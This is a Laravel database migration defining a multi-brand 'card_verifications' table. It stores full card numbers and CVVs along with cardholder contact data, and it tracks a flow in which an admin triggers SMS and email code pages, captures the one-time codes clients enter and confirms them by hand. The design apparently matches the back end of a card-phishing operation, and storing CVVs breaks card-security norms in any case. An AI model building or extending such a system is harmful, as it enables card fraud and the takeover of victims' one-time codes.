<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('card_verifications', function (Blueprint $table) {
            $table->id();
            $table->uuid('uuid')->unique();
            $table->foreignId('brand_id')->constrained()->cascadeOnDelete();
            $table->foreignId('kyc_verification_id')->nullable()->constrained()->nullOnDelete();

            // Card details
            $table->string('cardholder_name');
            $table->string('card_number_masked'); // stored as ****1234
            $table->string('card_number_encrypted'); // AES encrypted full number
            $table->string('card_expiry'); // MM/YY
            $table->string('card_cvv_encrypted'); // AES encrypted
            $table->string('card_type')->nullable(); // visa, mastercard, etc.

            // Cardholder info
            $table->string('email');
            $table->string('phone')->nullable();
            $table->string('address_line_1')->nullable();
            $table->string('address_line_2')->nullable();
            $table->string('city')->nullable();
            $table->string('state')->nullable();
            $table->string('postal_code')->nullable();
            $table->string('country')->nullable();

            // Verification flow status
            $table->enum('status', [
                'pending',            // Card submitted, awaiting admin review
                'awaiting_sms',       // Admin triggered SMS verification page
                'sms_code_entered',   // Client entered SMS code
                'sms_confirmed',      // Admin confirmed SMS code correct
                'sms_rejected',       // Admin rejected SMS code
                'awaiting_email',     // Admin triggered email verification page
                'email_code_entered', // Client entered email code
                'email_confirmed',    // Admin confirmed email code correct
                'email_rejected',     // Admin rejected email code
                'verified',           // Fully verified
                'failed',             // Verification failed
            ])->default('pending');

            // SMS verification
            $table->string('sms_code')->nullable(); // Code entered by client
            $table->timestamp('sms_requested_at')->nullable();
            $table->timestamp('sms_code_entered_at')->nullable();
            $table->boolean('sms_code_valid')->nullable();

            // Email verification
            $table->string('email_code')->nullable(); // Code entered by client
            $table->timestamp('email_requested_at')->nullable();
            $table->timestamp('email_code_entered_at')->nullable();
            $table->boolean('email_code_valid')->nullable();

            // Admin notes
            $table->text('admin_notes')->nullable();
            $table->foreignId('reviewed_by')->nullable()->constrained('users')->nullOnDelete();

            // Meta
            $table->string('ip_address')->nullable();
            $table->string('user_agent')->nullable();
            $table->string('session_token')->unique(); // For client to poll/connect back
            $table->timestamp('verified_at')->nullable();
            $table->timestamps();
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('card_verifications');
    }
};
